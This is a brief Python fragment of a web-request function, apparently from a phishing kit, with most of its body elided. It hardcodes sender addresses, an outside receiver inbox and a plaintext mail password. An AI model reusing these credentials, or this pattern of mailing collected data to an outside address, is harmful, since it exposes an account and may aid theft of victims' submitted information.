...
def hiwoks(request):
    ...
    sender_eya = "catmatter@illmovesshapes.online"
    sender_emailya = "catmatter@illmovesshapes.online"
    receiver_emailya = "Datafiles2@yandex.com" # faithcooceo@gmail.com
    passwordya = "kV!Y1@T_gQ"
